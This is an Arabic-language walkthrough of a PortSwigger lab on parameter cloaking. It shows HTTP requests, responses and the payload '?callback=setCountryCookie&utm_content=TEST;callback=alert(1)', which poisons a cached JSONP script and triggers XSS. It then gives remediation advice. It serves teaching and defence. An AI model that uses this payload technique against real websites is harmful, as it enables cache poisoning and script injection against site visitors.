# [Parameter cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

## **`الهدف`**
استخدم تقنية إخفاء المعلمات لتسميم ذاكرة التخزين المؤقت باستجابة تقوم بتنفيذ `alert(1)` في متصفح الضحية.
## **`خطوات الحل`**
سنقوم بتحويل طلب الدخول إلى اللاب إلى `Repeater`
```http
GET / HTTP/2
Host: 0a3d00f2039bfb9080f90d27005b001c.web-security-academy.net
Cookie: country=[object Object]; session=4Hu43ziaeMpMI0aXo0iaKc3biAiNyw1Z
```
بعد ذلك سنستعمل خيار `Guess query params` في إضافة `Param Miner` لنكتشف أن اللاب يدعم `utm_content` كمعلم غير مفهرس، ولكن إذا جربنا حقن كود `XSS`
```http
GET /?utm_content=hr8h98&utm_content=x;hr8h98=akzldka&test='/><script>alert(1)</script> HTTP/2
Host: 0a3d00f2039bfb9080f90d27005b001c.web-security-academy.net
Cookie: country=[object Object]; session=4Hu43ziaeMpMI0aXo0iaKc3biAiNyw1Z
```
فسنجد أنه يتم ترميزه في الاستجابة ولن يعمل
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 7
X-Cache: hit
Content-Length: 8472

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <link rel="canonical" href='//0a3d00f2039bfb9080f90d27005b001c.web-security-academy.net/?utm_content=hr8h98&amp;utm_content=x;hr8h98=akzldka&amp;test=&apos;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;'/>
        <title>Parameter cloaking</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script type="text/javascript" src="/js/geolocate.js?callback=setCountryCookie"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Parameter cloaking</h2>
                            <a class=link-back href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <img src="/resources/images/blog.svg">
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=6"><img src="/image/blog/posts/15.jpg"></a>
                        <h2>Meeting Up</h2>
                        <p>In the past arranging events, and to meet up with friends and family was easy. The first option for an event was to send out an invitation, in the post, and they would R.S.V.P, sorted. Numbers counted, an event arranged....</p>
                        <a class="button is-small" href="/post?postId=6">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=4"><img src="/image/blog/posts/12.jpg"></a>
                        <h2>It's All Just A Click Away</h2>
                        <p>What I love most about Social Media is how it fills my days. Time just evaporates with every word I read, every video I watch and every pointless self-analyzing quiz I take part in. I used to tell people I...</p>
                        <a class="button is-small" href="/post?postId=4">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=10"><img src="/image/blog/posts/34.jpg"></a>
                        <h2>Scams</h2>
                        <p>Where there is good there is evil and when it comes to the internet there is surely a scam not lurking too far away. Whether it's being promised thousands from an African prince or being blackmailed by someone claiming to...</p>
                        <a class="button is-small" href="/post?postId=10">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=9"><img src="/image/blog/posts/54.jpg"></a>
                        <h2>The First Ever Truly Eco Car Has Made It To Market</h2>
                        <p>Forget electricity, we know that's still a drain on the National Grid. Some clever little inventors in Ohio have come up with a way of getting your car moving with nothing but air. And better still, air from your own...</p>
                        <a class="button is-small" href="/post?postId=9">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=8"><img src="/image/blog/posts/19.jpg"></a>
                        <h2>Spider Web Security</h2>
                        <p>Today the President issued a red warning in relation to the breakdown of spider web security. So far all of the main banks and energy suppliers have been hit by this gang of thieves who are now on the run,...</p>
                        <a class="button is-small" href="/post?postId=8">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=2"><img src="/image/blog/posts/48.jpg"></a>
                        <h2>Look No Hands - The Game Plays Itself</h2>
                        <p>I was so fed up with my husband always sitting in front of the television playing his silly games, I did something about it. I came up with an idea that would revolutionize game playing in the future. I wrote...</p>
                        <a class="button is-small" href="/post?postId=2">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=1"><img src="/image/blog/posts/17.jpg"></a>
                        <h2>Passwords</h2>
                        <p>There are three types of password users in the world; those who remember them, those who don't, and those who write them down.</p>
                        <a class="button is-small" href="/post?postId=1">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=5"><img src="/image/blog/posts/27.jpg"></a>
                        <h2>Video Games Made Me A Better Surgeon</h2>
                        <p>Recently there was an article on this very subject. I felt it was slightly lacking in depth, there was a lot of input from professionals discussing dexterity, did video games improve that or make it worse. I imagine the surgeon...</p>
                        <a class="button is-small" href="/post?postId=5">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=7"><img src="/image/blog/posts/53.jpg"></a>
                        <h2>No More Burping Out Loud Guys</h2>
                        <p>One young woman fed up with her workmates burping out loud in the office took matters into her own hands.</p>
                        <a class="button is-small" href="/post?postId=7">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=3"><img src="/image/blog/posts/39.jpg"></a>
                        <h2>The Art Of Communication</h2>
                        <p>I'm a bit of a Francophile, so when I travel to France I love to speak their language. I'm by no means fluent but I give it my best shot. I usually travel with my partner and son, neither of...</p>
                        <a class="button is-small" href="/post?postId=3">View post</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```
ولكن بعد البحث قليلًا في الـ `HTTP history` سنجد هذا الطلب
```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
Host: 0a3d00f2039bfb9080f90d27005b001c.web-security-academy.net
Cookie: country=[object Object]; session=4Hu43ziaeMpMI0aXo0iaKc3biAiNyw1Z
```
وسنجد أن قيمة المعلم تنعكس في الاستجابة
```http
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 11
X-Cache: hit
Content-Length: 201

const setCountryCookie = (
country) => {
    document.cookie = 
    'country=' + country;

};
const setLangCookie = (lang) =
> {
    document.cookie = 
    'lang=' + lang;

};
setCountryCookie({
    "country": 
    "United Kingdom"
});
```
لذلك سنقوم بوضع المعلم التالي في طلب الـ `JS`
```Payload
?callback=setCountryCookie&utm_content=TEST;callback=alert(1)
```

```http
GET /js/geolocate.js?callback=setCountryCookie&utm_content=TEST;callback=alert(1) HTTP/2
Host: 0a3d00f2039bfb9080f90d27005b001c.web-security-academy.net
Cookie: country=[object Object]; session=4Hu43ziaeMpMI0aXo0iaKc3biAiNyw1Z
```
وقد نحتاج لتكرار إرسال الطلب أكثر من مرة حتى يتم تجديد الـ `Cache` وبعد ذلك نعود إلى اللاب ونضغط `Home` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
 القاعدة الذهبية: يجب أن يقرأ الـ `Cache` والـ `Backend` الروابط ويحللانها بنفس المنطق تماماً، فإذا كان السيرفر الخلفي مصمماً لسبب ما ليقبل الفاصلة المنقوطة `;` كفاصل للمعلمات، فيجب ضبط إعدادات السيرفر الـ `Cache` ليفهم أيضاً أن `;` تمثل فاصلاً، وبالتالي يقوم بتقسيم المعلمات بشكل صحيح عند بناء مفتاح التخزين `Cache Key`، مما سيمنع إخفاء المعلمات خلف بعضها البعض.
 
 ويجب تطبيق `Whitelist Validation` على المعلم `callback` لأن متغيرات الـ `JSONP callbacks` يجب ألا تقبل سوى الحروف الإنجليزية والأرقام والشرطة السفلية لذلك يجب إضافة فلتر  باستخدام تعبير نمطي `Regex` مثل `^[a-zA-Z0-9_]+$`.

ويجب إعداد الـ `Backend Framework` للاعتماد حصرياً على الرمز `&` كفاصل لمعلمات الـ `URL`، وعدم تقسيم الروابط عند رؤية الفاصلة المنقوطة `;`
